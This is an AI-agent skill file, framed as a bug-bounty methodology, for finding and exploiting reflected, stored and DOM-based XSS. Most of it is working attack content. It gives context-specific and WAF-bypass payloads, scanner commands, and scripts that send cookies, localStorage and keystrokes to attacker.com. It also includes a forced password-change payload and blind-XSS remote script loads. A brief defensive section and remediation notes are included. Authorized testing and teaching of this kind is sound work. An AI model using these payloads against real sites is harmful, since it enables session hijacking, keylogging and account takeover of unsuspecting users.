---
name: xss-reflected-stored-dom
description: >
  Detect and exploit Cross-Site Scripting (XSS) vulnerabilities including Reflected, Stored, and DOM-based
  variants. Use this skill when testing web applications for JavaScript injection, HTML injection, input
  sanitization bypass, or Content Security Policy evasion. Covers WAF bypass payloads, mutation XSS,
  blind XSS with out-of-band callbacks, and exploitation chains for session hijacking and account takeover.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0009]
  techniques: [T1189, T1059.007]
cve_references: [CVE-2023-29489, CVE-2024-21388]
owasp_category: "A03:2021-Injection"
platforms: [linux, windows, macos]
tags: [xss, cross-site-scripting, reflected-xss, stored-xss, dom-xss, waf-bypass, javascript-injection, bug-bounty]
tools: [burpsuite, dalfox, xsstrike, kxss, gxss, bxss]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# XSS Detection and Exploitation

## When to Use
- When testing web applications for JavaScript injection in user inputs
- During bug bounty hunting when you see reflected parameters in page source
- When testing rich text editors, comment systems, or profile fields for stored XSS
- When JavaScript dynamically processes URL fragments or `document.location`
- When you need to chain XSS with other vulnerabilities for account takeover
- When testing Content Security Policy (CSP) for bypass opportunities

**When NOT to use**: If the application has no user-facing HTML output (pure API backend) — use API security skills instead.

## Prerequisites
- Burp Suite with browser proxy configured
- `dalfox` or `XSStrike` for automated XSS scanning
- A blind XSS callback server (`bxss.me`, `xsshunter.com`, or self-hosted)
- Browser DevTools for DOM analysis
- Target must render user input somewhere in HTML/JS output

## Workflow

### Phase 1: Identify Injection Points

```bash
# Map all user-controllable inputs that reflect in the response
# Check: URL parameters, form fields, headers (Referer, User-Agent), cookies

# Quick reflection test — inject a unique string and search for it
CANARY="cybsk1337xss"

# Test URL parameters
curl -s "https://target.com/search?q=${CANARY}" | grep -i "$CANARY"

# Test with special characters to check encoding
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# Automated reflection detection with gxss
echo "https://target.com/search?q=test" | gxss -p cybsk1337

# Use kxss to find reflections with special chars unencoded
echo "https://target.com" | hakrawler | kxss
```

### Phase 2: Context Analysis — Where Does Input Land?

The bypass technique depends entirely on WHERE your input is reflected:

```
Context 1: Between HTML tags
  <div>YOUR_INPUT_HERE</div>
  → Payload: <script>alert(1)</script>
  → Payload: <img src=x onerror=alert(1)>

Context 2: Inside an HTML attribute
  <input value="YOUR_INPUT_HERE">
  → Payload: " onmouseover="alert(1)
  → Payload: "><script>alert(1)</script>

Context 3: Inside JavaScript
  var x = "YOUR_INPUT_HERE";
  → Payload: ";alert(1)//
  → Payload: '-alert(1)-'

Context 4: Inside a URL/href
  <a href="YOUR_INPUT_HERE">
  → Payload: javascript:alert(1)
  → Payload: data:text/html,<script>alert(1)</script>

Context 5: Inside CSS
  style="color: YOUR_INPUT_HERE"
  → Payload: red;background:url(javascript:alert(1))

Context 6: Inside a comment
  <!-- YOUR_INPUT_HERE -->
  → Payload: --><script>alert(1)</script><!--
```

### Phase 3: Reflected XSS Exploitation

```bash
# Basic payloads — test in order of increasing complexity
# Level 1: No filtering
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Level 2: Script tags blocked
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

# Level 3: Event handlers blocked
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">

# Level 4: WAF bypass payloads
<svg/onload=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg><script>al\u0065rt(1)</script>
<%00script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>

# Automated scanning with dalfox
dalfox url "https://target.com/search?q=test" \
  --blind "https://your-bxss-server.com" \
  --waf-evasion \
  -o xss_results.json

# XSStrike for advanced detection
python3 xsstrike.py -u "https://target.com/search?q=test" --fuzzer
```

### Phase 4: Stored XSS Testing

```bash
# Test every input that gets stored and displayed to other users:
# - Profile fields (name, bio, about)
# - Comments / reviews
# - File upload names
# - Support tickets
# - Forum posts

# Stored XSS payload examples
# In profile name:
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

# In file upload name:
"><img src=x onerror=alert(document.domain)>.png

# Blind XSS (triggers when admin views your input):
"><script src=https://your-bxss-server.com/payload.js></script>

# Polyglot payload (works in multiple contexts):
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Phase 5: DOM-based XSS

```javascript
// DOM XSS sources — where user input enters the DOM
// Check if any of these flow to dangerous sinks:

// Sources:
document.URL
document.documentURI
document.location (href, search, hash, pathname)
document.referrer
window.name
window.postMessage()
localStorage / sessionStorage

// Sinks (dangerous functions):
eval()
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
$.html()  // jQuery
setTimeout(userInput)
setInterval(userInput)
new Function(userInput)
location.href = userInput
location.assign(userInput)

// Test DOM XSS via URL fragment (not sent to server):
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#javascript:alert(1)

// Look for patterns in JavaScript source:
// Vulnerable pattern:
document.getElementById('output').innerHTML = location.hash.slice(1);

// Use browser DevTools to find DOM XSS:
// 1. Open DevTools → Sources → Event Listener Breakpoints
// 2. Check "Script > Script First Statement"
// 3. Trace user input through JavaScript execution
```

### Phase 6: Impact Escalation

```javascript
// Beyond alert(1) — demonstrate real impact:

// Session hijacking
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: window.location.href
  })
});
</script>

// Account takeover via password change
<script>
fetch('/api/user/change-password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({new_password: 'hacked123'})
});
</script>

// Keylogger
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?k=' + e.key);
};
</script>

// Crypto miner injection (for impact demonstration only)
// Phishing overlay injection
// Admin panel access via stored XSS
```


## 🔵 Blue Team Detection

- **CSP headers**: Implement strict Content Security Policy (`script-src 'self'`)
- **Output encoding**: HTML-entity encode all user input on output
- **Input validation**: Whitelist allowed characters where possible
- **WAF rules**: Block common XSS patterns but don't on WAF
- **Sigma rule**: Detect XSS payloads in web server access logs
- **HTTPOnly cookies**: Prevent cookie theft via JavaScript

## Key Concepts
| Concept | Description |
|---------|-------------|
| Reflected XSS | Payload in request is immediately reflected in response |
| Stored XSS | Payload is saved server-side and served to other users |
| DOM XSS | Payload processed entirely client-side via JavaScript |
| Blind XSS | Stored XSS that triggers in a context you can't see (admin panel) |
| Mutation XSS | Exploiting browser's HTML parser mutations to bypass sanitization |
| CSP bypass | Circumventing Content Security Policy to execute scripts |
| Polyglot | Single payload that works across multiple injection contexts |

## Tools & Systems
| Tool | Purpose | Install |
|------|---------|---------|
| Dalfox | Fast XSS scanner with WAF evasion | `go install github.com/hahwul/dalfox/v2@latest` |
| XSStrike | Advanced XSS detection with fuzzer | `pip3 install xsstrike` |
| BXSS | Blind XSS callback server | `bxss.me` or self-hosted |
| kxss | Find reflected parameters with special chars | `go install github.com/Emoe/kxss@latest` |
| Burp Suite | Intercept, modify, and replay XSS payloads | portswigger.net |

## Output Format
```
XSS Vulnerability Report
========================
Title: Stored XSS in User Profile Bio Field
Severity: HIGH (CVSS 8.1)
Type: Stored XSS
Endpoint: POST /api/v1/profile/update (bio parameter)
Trigger: GET /user/{username}/profile (any visitor)

Steps to Reproduce:
1. Login as attacker, navigate to profile settings
2. Set bio field to: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
3. Save profile
4. When any user visits attacker's profile page, their cookies are exfiltrated

Impact:
- Session hijacking of any user who views the profile
- Account takeover via cookie theft
- Mass exploitation possible (visible on public profiles)
- Can escalate to admin account takeover via blind XSS

Remediation:
- Implement output encoding (HTML entity encoding) for all user-generated content
- Deploy Content Security Policy: script-src 'self'
- Mark session cookies as HttpOnly and Secure
- Use DOMPurify library for client-side HTML sanitization
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- PortSwigger: [XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- MITRE ATT&CK: [T1059.007 — JavaScript](https://attack.mitre.org/techniques/T1059/007/)
- PayloadsAllTheThings: [XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
